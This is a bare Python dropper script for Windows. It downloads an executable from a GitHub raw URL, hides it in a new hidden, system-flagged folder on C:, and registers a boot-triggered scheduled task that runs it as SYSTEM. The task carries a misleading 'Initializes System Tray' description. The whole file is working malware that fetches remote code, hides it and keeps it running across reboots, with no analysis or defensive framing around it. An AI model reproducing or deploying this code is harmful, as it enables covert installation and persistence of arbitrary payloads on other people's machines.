import requests
import os
import shutil
import win32con
import win32api
import datetime
import win32com.client

#Acquire exe from github
url = "https://raw.githubusercontent.com/jad2447-eng/tyranthost/main/Yengii_Jii.exe"
response = requests.get(url)

#Write exe to the disk
with open("Yengii_Jii.exe", "wb") as file:
    file.write(response.content)

#Create location, hide location, and move the exe there.
os.makedirs("C:/newLocation")
shutil.move("Yengii_Jii.exe", "C:/newLocation")
win32api.SetFileAttributes("C:/newLocation", win32api.GetFileAttributes("C:/newLocation") | win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)

#Add persistance

# Connect to the Task Scheduler service
scheduler = win32com.client.Dispatch("Schedule.Service")
scheduler.Connect()
root_folder = scheduler.GetFolder("\\")

# Create a new task definition
task_def = scheduler.NewTask(0)

# Define the trigger (At startup / boot)
TASK_TRIGGER_BOOT = 8
trigger = task_def.Triggers.Create(TASK_TRIGGER_BOOT)
trigger.StartBoundary = datetime.datetime.now().isoformat()

# Define the action (Start a program)
TASK_ACTION_EXEC = 0
action = task_def.Actions.Create(TASK_ACTION_EXEC)
action.ID = "Initialize System Tray"
action.Path = r"C:/newLocation/Yengii_Jii.exe"

# Set task settings
task_def.RegistrationInfo.Description = "Initializes System Tray on Startup"
task_def.Settings.Enabled = True
task_def.Settings.StopIfGoingOnBatteries = False
task_def.Settings.AllowHardTerminate = True
task_def.Settings.RunOnlyIfNetworkAvailable = False
task_def.Principal.RunLevel = 1

# Register the task
# TASK_CREATE_OR_UPDATE = 6
root_folder.RegisterTaskDefinition(
    'Startup Task',
    task_def,
    6,
    'SYSTEM',      # Run as SYSTEM (required for boot triggers)
    None,
    5              # TASK_LOGON_SERVICE_ACCOUNT
)